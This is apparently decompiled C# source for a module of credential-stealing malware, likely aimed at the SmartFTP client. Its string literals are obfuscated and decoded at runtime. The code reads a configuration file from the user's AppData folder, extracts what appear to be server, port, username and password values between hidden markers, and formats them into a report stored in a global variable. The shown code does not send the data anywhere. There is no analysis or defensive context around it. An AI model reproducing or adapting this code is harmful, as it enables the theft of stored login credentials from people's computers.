using System;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class DASMRTFTP
{
	public class Smartdll
	{
		public static void GTMYSmart()
		{
			try
			{
				string sFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("l6nOycyvnLW4tn7Cys3Ir3aTloqXnMLeya2/1c3Nl6fW0b2mdqTXyKm7xNy2Cw==", "False") + FileSystem.Dir(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + RUDUUFDP.CPMXFIPG("l6nOycyvnLW4tn7Cys3Ir3aTloqXnMLeya2/1c3Nl6fW0b2mdqTXyKm7xNy2ZYTZ1cYL", "False"), (FileAttribute)0);
				string sInhalt = RDFLE3(sFile);
				string text = CTME2(sInhalt, RUDUUFDP.CPMXFIPG("aZDCzcBrGg==", "False"), RUDUUFDP.CPMXFIPG("eIaq2M6wlQw=", "False"));
				string text2 = CTME2(sInhalt, RUDUUFDP.CPMXFIPG("dKPN18t2Dw==", "False"), RUDUUFDP.CPMXFIPG("Z3Whx7yfhB0=", "False"));
				string text3 = CTME2(sInhalt, RUDUUFDP.CPMXFIPG("d6vUzcx5DA==", "False"), RUDUUFDP.CPMXFIPG("WWeYvaGPdis=", "False"));
				string text4 = CTME2(sInhalt, RUDUUFDP.CPMXFIPG("U4Ket6mOoa+odC8=", "False"), RUDUUFDP.CPMXFIPG("Y3GdtbmaubzGqmUg", "False"));
				string text5 = CTME2(sInhalt, RUDUUFDP.CPMXFIPG("cJ27zrhyEw==", "False"), RUDUUFDP.CPMXFIPG("VGKMpqR9cTA=", "False"));
				string text6 = (JNXOYT.YTOKH = ((Operators.CompareString(text3, "", false) == 0) ? (RUDUUFDP.CPMXFIPG("hJ+qsaOEn6qxo4SfwOHHudazyLaEn6qxo4SfqrGjhJ+qsQM=", "False") + Environment.NewLine + RUDUUFDP.CPMXFIPG("aqZim6B/prStrjx9sb6pgGVwd2lKZSw=", "False") + Environment.NewLine + RUDUUFDP.CPMXFIPG("fpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpkH", "False")) : (RUDUUFDP.CPMXFIPG("hJ+qsaOEn6qxo4SfwOHHudazyLaEn6qxo4SfqrGjhJ+qsQM=", "False") + Environment.NewLine + RUDUUFDP.CPMXFIPG("YaW2u7RWVyw=", "False") + text5 + Environment.NewLine + RUDUUFDP.CPMXFIPG("h8nY4JhfCA==", "False") + text + RUDUUFDP.CPMXFIPG("eAk=", "False") + text2 + Environment.NewLine + RUDUUFDP.CPMXFIPG("kMnG2sicw8aiegs=", "False") + text3 + Environment.NewLine + RUDUUFDP.CPMXFIPG("Z5Owt62GpKF+Vi8=", "False") + text4 + RUDUUFDP.CPMXFIPG("RmmRwaiYurzHbiA=", "False") + Environment.NewLine + RUDUUFDP.CPMXFIPG("fpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpkH", "False"))));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				JNXOYT.YTOKH = "";
				ProjectData.ClearProjectError();
			}
		}

		public static string RDFLE3(string sFile)
		{
			string result = default(string);
			try
			{
				StreamReader streamReader = new StreamReader(sFile);
				result = streamReader.ReadToEnd().ToString();
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string CTME2(string sInhalt, string sText, string sText2)
		{
			string result = default(string);
			try
			{
				string[] array = Strings.Split(sInhalt, sText, -1, (CompareMethod)0);
				string[] array2 = Strings.Split(array[1], sText2, -1, (CompareMethod)0);
				result = array2[0];
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
